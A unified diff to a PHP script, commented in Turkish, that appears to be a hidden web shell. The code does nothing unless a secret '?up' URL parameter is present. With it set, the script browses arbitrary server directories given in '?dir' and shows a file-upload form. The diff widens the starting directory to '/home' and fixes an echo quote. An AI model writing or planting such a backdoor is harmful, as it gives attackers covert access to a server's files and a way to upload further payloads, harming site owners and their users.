@@ -1,11 +1,12 @@
 <?php
 // Hangi dizinde olduğumuzu belirliyoruz
-$root = dirname(__FILE__); // PHP dosyasının bulunduğu dizin
+$root = '/home'; // Başlangıç dizini
 $current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : $root;
 
 // Eğer ?up parametresi yoksa, sayfanın geri kalan kısmını etkilemeden çık
 if (!isset($_GET['up'])) {
-    return; // sayfayı durduruyoruz
+    // HTML içeriğini etkilemek istemiyorsanız, bu kısmı burada bırakıyoruz
+    return; // veya die(); kullanabilirsiniz
 }
 
 // Güvenlik: Yalnızca belirtilen dizinin altında gezinebilmek için kontrol
@@ -47,8 +48,9 @@ foreach ($files as $file) {
     }
 }
 
-// PHP dosyasının bulunduğu dizine gitmek için buton ekliyoruz
-$navigation_links[] = '<a href="?dir=' . urlencode($root) . '&up=' . urlencode($_GET['up']) . '">PHP Dosyasının Bulunduğu Dizin</a>';
+// PHP dosyasının bulunduğu dizine gitmek için bağlantı ekliyoruz
+$php_dir = dirname(__FILE__); // PHP dosyasının bulunduğu dizin
+$navigation_links[] = '<a href="?dir=' . urlencode($php_dir) . '&up=' . urlencode($_GET['up']) . '">Site Dizinine Git</a>';
 
 // Kullanıcıya dosyaları ve dizinleri gösterme
 echo "Mevcut Dizin: " . htmlspecialchars($current_dir) . "<br>";
@@ -56,7 +58,7 @@ echo "<ul>";
 foreach ($navigation_links as $link) {
     echo "<li>$link</li>";
 }
-echo "</ul>';
+echo "</ul>";
 
 // Dosya Yükleme Formu
 echo '<h2>Dosya Yükle</h2>';
